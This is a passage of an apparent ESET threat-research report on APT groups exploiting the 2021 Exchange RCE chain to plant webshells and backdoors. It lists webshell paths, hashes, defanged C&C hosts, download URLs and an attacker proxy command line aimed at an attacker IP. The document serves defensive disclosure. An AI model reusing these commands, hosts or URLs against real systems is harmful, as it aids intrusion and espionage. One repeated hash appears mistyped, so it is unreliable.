These](https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/)\nsecurity updates fixed a pre-authentication remote code execution (RCE) vulnerability chain (CVE-2021-26855, CVE2021-26857, CVE-2021-26858, and CVE-2021-27065) that allows an attacker to take over any reachable Exchange\nserver, without even knowing any valid account credentials. We have already detected webshells on more than 5,000\nemail servers as of the time of writing, and according to public sources, several important organizations, such as the\n[European Banking Authority, suffered from this attack.](https://www.eba.europa.eu/cyber-attack-european-banking-authority)\n\nESET customers are advised to read the following articles for information related to ESET products:\n_[A Microsoft Exchange saga: How is ESET technology protecting business customers post-exploitation?

However, according to a blogpost by Volexity, in-the-wild exploitation had already started on\n2021-01-03. Thus, if these dates are correct, the vulnerabilities were either independently discovered by two different\nvulnerability research teams or that information about the vulnerabilities was somehow obtained by a malicious entity.\nMicrosoft also published a blogpost about the early activity of Hafnium.\n\nOn 2021-02-28, we noticed that the vulnerabilities were used by other threat actors, starting with Tick and quickly joined\nby LuckyMouse, Calypso and the Winnti Group. This suggests that multiple threat actors gained access to the details of\nthe vulnerabilities before the release of the patch, which means we can discard the possibility that they built an exploit by\nreverse engineering Microsoft updates.\n\n_READ NEXT:_ _[Prime targets: Governments shouldn’t go it alone on cybersecurity](https://www.welivesecurity.com/2021/04/29/prime-targets-governments-shouldnt-go-it-alone-on-cybersecurity/)_\nFinally, the day after the release of the patch, we started to see many more threat actors (including Tonto Team and\nMikroceen) scanning and compromising Exchange servers en masse. Interestingly, all of them are APT groups interested\nin espionage, except for one outlier (DLTMiner), which is linked to a known cryptomining campaign. A summary of the\ntimeline is shown in Figure 1.\n\n_Figure 1. Timeline of important events_\n\n## Exploitation statistics\n\nFor the past few days, ESET researchers have been monitoring closely the number of webshell detections for these\nexploits. At the date of publication, we had observed more than 5,000 unique servers in over 115 countries where\nwebshells were flagged. These numbers utilize ESET telemetry and are (obviously) not complete. Figure 2 illustrates\nthese detections before and after the patch from Microsoft.\n\n\n-----\n\n_Figure 2. ESET detection of the webshells dropped via CVE-2021-26855 (hourly)_\n\nThe heatmap in Figure 3 shows the geographical distribution of the webshell detections, according to ESET telemetry.\nDue to mass exploitation, it is likely that it represents the distribution of vulnerable Exchange servers around the world on\nwhich ESET security products are installed.\n\n_Figure 3. Proportion of webshell detections by country (2021-02-28 to 2021-03-09)_\n\n## From RCE to webshells to backdoors\n\nWe have identified more than 10 different threat actors that likely leveraged the recent Microsoft Exchange RCE in order\nto install implants on victims’ email servers.\n\nOur analysis is based on email servers on which we found webshells in Offline Address Book (OAB) configuration files,\nwhich is a specific technique used in the exploitation of the RCE vulnerability and has already been detailed in a Unit 42\nblogpost. Unfortunately, we cannot discount the possibility that some threat actors might have hijacked the webshells\ndropped by other groups rather than directly using the exploit.\n\n\n-----\n\nOnce the vulnerability had been exploited and the webshell was in place, we observed attempts to install additional\nmalware through it. We also noticed in some cases that several threat actors were targeting the same organization.\n\n### Tick\n\nOn 2021-02-28, Tick (also known as Bronze Butler) compromised the webserver of a company based in East Asia that\nprovides IT services. This means that the group likely had access to the exploit prior to the patch’s release – in this case\nat least two days before.\n\nThe attacker used the following name for the first-stage webshell:\n\nC:\\inetpub\\wwwroot\\aspnet_client\\aspnet.aspx\n\n[We then observed a Delphi backdoor, highly similar to previous Delphi implants used by the group. C&C addresses used](https://github.com/RedDrip7/APT_Digital_Weapon/blob/master/Tick/Tick_hash.md)\nby this backdoor are www.averyspace[.]net and www.komdsecko[.]net.\n\n_Tick is an APT group active since as early as 2008 and targeting organizations primarily based in Japan but also in South_\n_Korea, Russia and Singapore amongst others. Its main objective seems to be intellectual property and classified_\n_information theft. It makes use of various proprietary malware such as Daserf, xxmm and Datper as well as open source_\n_RATs such as Lilith. Tick is among the APT groups now having access to the ShadowPad backdoor, which was used_\n_[during Operation ENTRADE documented by Trend Micro.](https://www.trendmicro.com/en_us/research/19/k/operation-endtrade-finding-multi-stage-backdoors-that-tick.html)_\n\n### LuckyMouse\n\nOn 2021-03-01, LuckyMouse compromised the email server of a governmental entity in the Middle East, which means\nthis APT group likely had access to the exploit at least one day before the patch release, when it was still a zero day.\n\n[LuckyMouse operators started by dropping the Nbtscan tool in C:\\programdata\\, then installed a variant of the ReGeorg](http://www.unixwiz.net/tools/nbtscan.html)\n[webshell and issued a GET request to http://34.90.207[.]23/ip using curl. Finally, they attempted to install their SysUpdate](https://curl.se/)\n(aka Soldier) modular backdoor that uses the aforementioned IP address as its C&C server.\n\n_LuckyMouse, also known as APT27 and Emissary Panda, is a cyberespionage group known to have breached multiple_\n_government networks in Central Asia and the Middle East but also transnational organizations such as International Civil_\n_[Aviation Organization (ICAO) in 2016. It uses various custom malware families such as HyperBro and SysUpdate.](https://securelist.com/luckymouse-hits-national-data-center/86083/)_\n\n### Calypso\n\n[On 2021-03-01, Calypso compromised the email servers of governmental entities in the Middle East and in South](https://www.ptsecurity.com/ww-en/analytics/calypso-apt-2019/)\nAmerica, which means the group likely had access to the exploit as a zero day, like LuckyMouse and Tick. In the\nfollowing days, Calypso operators targeted additional servers of governmental entities and private companies in Africa,\nAsia and Europe using the exploit.\n\nThe attacker used the following names for the first-stage webshell:\n\nC:\\inetpub\\wwwroot\\aspnet_client\\client.aspx\nC:\\inetpub\\wwwroot\\aspnet_client\\discover.aspx\n\nAs part of these attacks, two different backdoors were observed: a variant of PlugX specific to the group\n(Win32/Korplug.ED) and a custom backdoor that we detect as Win32/Agent.UFX (known as Whitebird in a Dr.Web\nreport). These tools are loaded using DLL search-order hijacking against legitimate executables (also dropped by the\nattackers):\n\nnetcfg.exe (SHA-1: 1349EF10BDD4FE58D6014C1043CBBC2E3BB19CC5) using a malicious DLL named\nnetcfg.dll (SHA-1: EB8D39CE08B32A07B7D847F6C29F4471CD8264F2)\nCLNTCON.exe (SHA-1: B423BEA76F996BF2F69DCC9E75097635D7B7A7AA) using a malicious DLL named\nSRVCON.OCX (SHA-1: 30DD3076EC9ABB13C15053234C436406B88FB2B9)\niPAQDetetion2.exe (SHA-1: C5D8FEC2C34572F5F2BD4F6B04B75E973FDFEA32) using a malicious DLL named\nrapi.dll (SHA-1: 4F0EA31A363CFE0D2BBB4A0B4C5D558A87D8683E)\n\n\n-----\n\nThe backdoors were configured to connect to the same C&C servers: yolkish[.]com and rawfuns[.]com.\n\n[Finally, we also observed a variant of a tool known as Mimikat_ssp that is available on GitHub.](https://github.com/jas502n/mimikat_ssp)\n\n_[Calypso (which is also tied to XPATH) is a cyberespionage group targeting governmental institutions in Central Asia, the](https://www.ptsecurity.com/ww-en/analytics/calypso-apt-2019/)_\n_Middle East, South America and Asia. Its main implant is a variant of the PlugX RAT._\n\n### Websiic\n\nStarting 2021-03-01, ESET researchers observed a new cluster of activity we have named Websiic, targeting seven\nemail servers belonging to private companies (in the domains of IT, telecommunications and engineering) in Asia and a\ngovernmental body in Eastern Europe. As observed in the cases above, the operators behind this cluster likely had\naccess to the exploit before the patch’s release.\n\nThis cluster was identified by the presence of a loader as its first stage, generally named google.log or google.aspx, and\nan encrypted configuration file, generally named access.log. The loader stops a specific service identified in the config\nand creates a new entry under the Windows service registry HKLM\\SYSTEM\\CurrentControlSet\\Services\\\n<servicename>\\Parameters (the service’s filename is provided by the config). It sets two keys ServiceDll and\nServiceMain. The first one contains the path to a DLL while the latter contains the export to call (INIT in this case).\nFinally, it restarts the service that was stopped at the outset.\n\nWhile the loader was deployed on all victims from this cluster, the second stage (also a loader) was observed on the\ncomputer of only one of the victims and was located in C:\\Program Files\\Common Files\\microsoft shared\\WMI\\iiswmi.dll.\nThe DLL has an export named INIT that contains the main logic and uses the same XOR encryption loop as well as the\nsame technique to dynamically resolve the Windows API names as seen in the first stage. It loads the following DLL\n%COMMONPROGRAMFILES%\\System\\websvc.dll with an argument extracted from the registry key\nHKLM\\SOFTWARE\\Classes\\Interface\\{6FD0637B-85C6-D3A9-CCE9-65A3F73ADED9}. Unfortunately, the lack of\nindicators matching previously known threat actors prevents us from drawing any conclusions or a reasonable hypothesis\nas to the group behind these attacks.\n\n_Seven victims were flagged by the presence of the first loader and at one of them, the second loader was identified. We_\n_have not currently tied any known threat actor to Websiic. A recent article from_ _[GTSC also briefly describes the same](https://gteltsc.vn/blog/cap-nhat-nhe-ve-lo-hong-bao-mat-0day-microsoft-exchange-dang-duoc-su-dung-de-tan-cong-cac-to-chuc-tai-viet-nam-9685.html)_\n_cluster._\n\n### Winnti Group\n\nStarting 2021-03-02, a few hours before Microsoft released the patch, the Winnti Group (also known as BARIUM or\nAPT41) compromised the email servers of an oil company and a construction equipment company both based in East\nAsia. This indicates that this APT group also had access to the exploit prior to the patch release.\n\nThe attackers started by dropping webshells at the following locations, depending on the victim:\n\nC:\\inetpub\\wwwroot\\aspnet_client\\caches.aspx\nC:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx\n\nAt one of the compromised victims we observed a PlugX RAT sample (also known as Korplug) with C&C domain\nmm.portomnail[.]com and back.rooter.tk. Note that mm.portomnail[.]com was [previously used by the Winnti Group with](https://techcommunity.microsoft.com/t5/azure-sentinel/hunting-for-barium-using-azure-sentinel/ba-p/1875913)\nShadowPad and the Winnti malware. On the same machine, during the same timeframe, we also observed some\nmalware, not yet fully analyzed, using 139.162.123[.]108 as its C&C address but at the time of writing we don’t know\nwhether this is related to the Exchange compromise or not.\n\nAt the second victim, we observed a loader that is highly similar to previous Winnti v4 malware loaders such as that\n[mentioned in our white paper on the arsenal of the Winnti Group. Like that Winnti v4 loader, this loader is used to decrypt](https://www.welivesecurity.com/2019/10/14/connecting-dots-exposing-arsenal-methods-winnti/)\nan encrypted payload from disk and execute it using the following command:\n\nsrv64.exe <Decryption_Key> <Encrypted_Payload_Filename>\n\nwhere <Decryption_key> is the decryption key used to decrypt the payload stored in <Encrypted_Payload_Filename>.\nOnce executed, this loader drops a malicious DLL at the following location:\n\n\n-----\n\nC:\\Windows\\system32\\oci.dll\n\n[This malicious DLL shares multiple similarities with a previous Winnti implant documented by Trend Micro as well as the](https://news.drweb.com/show/?i=14154&lng=en)\n[Spyder backdoor recently documented by DrWeb and that we have observed being used by the Winnti Group in the past.](https://news.drweb.com/show/?i=14154&lng=en)\nThe C&C address used by this implant is 161.129.64[.]124:443.\n\nAdditionally, we observed various Mimikatz and password dumping tools.\n\n_The_ _[Winnti Group, active since at least 2012, is responsible for high-profile supply-chain attacks against the video game](https://www.welivesecurity.com/2019/10/14/connecting-dots-exposing-arsenal-methods-winnti/)_\n_[and software industries, leading to the distribution of trojanized software (such as CCleaner, ASUS LiveUpdate and](https://www.welivesecurity.com/2017/09/21/cconsiderations-on-ccleaner-incident/%22%20/)_\n_[multiple video games) that is then used to compromise more victims. It is also known for having compromised various](https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/)_\n_targets in multiple different verticals such as healthcare and education._\n\n### Tonto Team\n\nOn 2021-03-03, Tonto Team (also known as CactusPete) compromised the email servers of a procurement company and\nof a consulting company specialized in software development and cybersecurity, both based in Eastern Europe.\n\nIn that case, the attacker used C:\\inetpub\\wwwroot\\aspnet_client\\dukybySSSS.aspx for the first-stage webshell.\n\nThe attacker then used PowerShell to download their payloads from 77.83.159[.]15. Those payloads consist of a\nlegitimate and signed Microsoft executable used as a DLL search-order hijacking host and a malicious DLL loaded by\nthat executable. The malicious DLL is a ShadowPad loader. The C&C address being used by ShadowPad here is\nlab.symantecsafe[.]org and the communication protocol is HTTPS.\n\nIn addition to ShadowPad, the attacker also made use of a variant of the Bisonal RAT highly similar to a Bisonal variant\n[that was previously used during Operation Bitter Biscuit attributed to Tonto Team.](https://global.ahnlab.com/global/upload/download/asecreport/ASEC%20REPORT_vol.93_ENG.pdf)\n\nOn one of the compromised machines, the attacker used an LSAS dumper that was also previously used by Tonto Team.\n\n_Tonto Team is an APT group active since at least 2009 and targeting governments and institutions mostly based in_\n_Russia, Japan and Mongolia. For more than ten years, Tonto Team has been using the Bisonal RAT. Tonto Team is one_\n_of the APT groups that now has access to the ShadowPad backdoor._\n\n### Unattributed ShadowPad activity\n\nStarting 2021-03-03, we observed the compromise of email servers at a software development company based in East\nAsia and a real estate company based in the Middle East where ShadowPad was dropped by the attacker and that we\nwere not able to conclusively attribute to any known groups at the time of writing.\n\nThe attackers used C:\\inetpub\\wwwroot\\aspnet_client\\discover.aspx and C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\RedirSuiteServerProxy.aspx as first-stage webshells and dropped ShadowPad\nat the following locations:\n\nC:\\Windows\\Help\\mui\\0109\\mscoree.dll\nC:\\mscoree.dll\n\nOne of the ShadowPad samples uses soft.mssysinfo[.]xyz as its C&C address using the HTTPS protocol while the\nsecond sample uses ns.rtechs[.]org using the DNS protocol, which is less common.\n\n_The ShadowPad backdoor is a modular backdoor that was exclusive to the Winnti Group until the end of 2019. To the_\n_best of our knowledge, ShadowPad is now used by at least five additional groups: Tick, Tonto Team, KeyBoy, IceFog and_\n_TA428._\n\n### The “Opera” Cobalt Strike\n\nOn 2021-03-03 at 04:23 AM UTC, just a few hours after the patch was released, we noticed that another set of malicious\nactivities had started. At this point we don’t know if these threat actors had access to the exploit beforehand or reverse\n[engineered the patch. This corresponds to indicators that were published on Twitter and by](https://twitter.com/jhencinski/status/1367141043695742977) [FireEye, but we haven’t been](https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html)\nable to link this set to any group we are already tracking\n\n\n-----\n\nFrom 2021 03 03 to 2021 03 05, ESET telemetry shows this activity targeting around 650 servers, mostly in the US,\nGermany, the UK and other European countries. Interestingly, this threat actor was consistent in the naming and location\nof their first-stage webshell, always using\n<Exchange_install_directory>\\FrontEnd\\HttpProxy\\owa\\auth\\RedirSuiteServerProxy.aspx.\n\nThen on a few selected machines, they executed a PowerShell script, shown in Figure 4, to download additional\ncomponents from 86.105.18[.]116. The final payload is Cobalt Strike, which uses the same IP address for its C&C server.\nCobalt Strike is loaded via DLL search-order hijacking against a legitimate Opera executable named opera_browser.exe\n(SHA-1: AB5AAA34200A3DD2276A20102AB9D7596FDB9A83) using a DLL named opera_browser.dll (SHA-1:\n02886F9DAA13F7D9855855048C54F1D6B1231B0A) that decrypts and loads a shellcode from opera_browser.png\n(SHA-1: 2886F9DAA13F7D9855855048C54F1D6B1231B0A). We noticed that 89.34.111[.]11 was also used to distribute\nmalicious files.\n\n_Figure 4. PowerShell script used to download Cobalt Strike_\n\n### IIS backdoors\n\nStarting 2021-03-03, we observed that on four email servers located in Asia and South America, webshells were used to\ninstall so-called IIS backdoors.\n\nWe identified two different malware families:\n\n[A modified version of IIS-Raid. It comes from a PoC released on GitHub and documented last year by MDSec.](https://github.com/0x09AL/IIS-Raid)\n[A variant of Owlproxy, which was documented last year by Cycraft as part of several incidents against Taiwanese](https://medium.com/cycraft/taiwan-government-targeted-by-multiple-cyberattacks-in-april-2020-3b20cea1dc20)\ngovernmental agencies.\n\n### Mikroceen\n\n[On 2021-03-04, the Mikroceen APT group compromised the Exchange server of a utility company in Central Asia, which](https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/)\nis the region it mainly targets.\n\nMikroceen operators started by dropping webshells in C:\\inetpub\\wwwroot\\aspnet_client\\aspnet_regiis.aspx,\n<Exchange_install_directory>\\FrontEnd\\HttpProxy\\owa\\auth\\aspnet_error.aspx and\nC:\\inetpub\\wwwroot\\aspnet_client\\log_error_9e23efc3.aspx. Then, they downloaded a payload we could not recover from\nhttp://46.30.188[.]60/webengine4.dll. We were not able to tie those first steps to Mikroceen with high confidence, but\nthese indicators appeared only on the specific server where we saw the Mikroceen backdoors a few hours after.\n\nA few hours later, a Mikroceen RAT was dropped in C:\\Users\\Public\\Downloads\\service.exe. Its C&C server is\n172.105.18[.]72. Then, this RAT dropped additional tools such as Mimikatz (in C:\\users\\public\\alg.exe), Mimikat_ssp (in\nC:\\users\\public\\Dump.exe) and a custom proxy (in c:\\Users\\Public\\calcx.exe). The latter was executed with the following\ncommand line (exposing another attacker-controlled IP address):\n\ncalcx.exe 300 194.68.44[.]19 c:\\users\\public\\1.log <private IP>:3128\n\n_The_ _[Mikroceen APT group (aka](https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/)_ _[Vicious Panda) is a threat actor operating since at least 2017. It mainly targets](https://research.checkpoint.com/2020/vicious-panda-the-covid-campaign/)_\n_[governmental institutions and telcos in Central Asia, Russia and Mongolia. It uses a custom backdoor we’ve named](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07170759/Microcin_Technical_4PDF_eng_final_s.pdf)_\n_Mikroceen RAT._\n\n\n-----\n\n### DLTMiner\n\nStarting 2021-03-05 at 02:53 AM UTC, we detected the deployment of PowerShell downloaders on multiple email\nservers that were previously targeted using these Exchange vulnerabilities.\n\nThe first PowerShell script downloads the next stage at the following address http://p.estonine[.]com/p?e. Previous\narticles from 2019 show similarities between this cluster and a cryptominer campaign. More details about the analysis\n[can be found in Tencent and](https://s.tencent.com/research/report/709.html) [Carbon Black blogposts. A more recent](https://www.carbonblack.com/blog/cb-tau-technical-analysis-dltminer-campaign-targeting-corporations-in-asia/) [Twitter post describes the various compromise](https://twitter.com/KyleHanslovan/status/1368071668678201344)\nsteps.\n\nWe were unable to find any correlation in terms of webshells deployed on these servers. It is possible that this group is\nhijacking webshells previously installed by other threat groups.\n\n## Summary\n\nOur ongoing research shows that not only Hafnium has been using the recent RCE vulnerability in Exchange, but that\nmultiple APTs have access to the exploit, and some even did so prior to the patch release. It is still unclear how the\ndistribution of the exploit happened, but it is inevitable that more and more threat actors, including ransomware\noperators, will have access to it sooner or later.\n\n[It is now clearly beyond prime time to patch all Exchange servers as soon as possible (see Microsoft guidance and apply](https://techcommunity.microsoft.com/t5/exchange-team-blog/march-2021-exchange-server-security-updates-for-older-cumulative/ba-p/2192020)\nspecial care in following the steps in the “About installation of these updates” section). Even those not directly exposed to\nthe internet should be patched because an attacker with low, or unprivileged, access to your LAN can trivially exploit\nthese vulnerabilities to raise their privileges while compromising an internal (and probably more sensitive) Exchange\nserver, and then move laterally from it.\n\nIn case of compromise, one should remove webshells, change credentials and investigate for any additional malicious\nactivity.\n\nFinally, this is a very good reminder that complex applications such as Microsoft Exchange or SharePoint should not be\nopen to the internet since, in case of mass exploitation, it is very hard, if not impossible, to patch in time.\n\n_For any inquiries, or to make sample submissions related to the subject, contact us at:
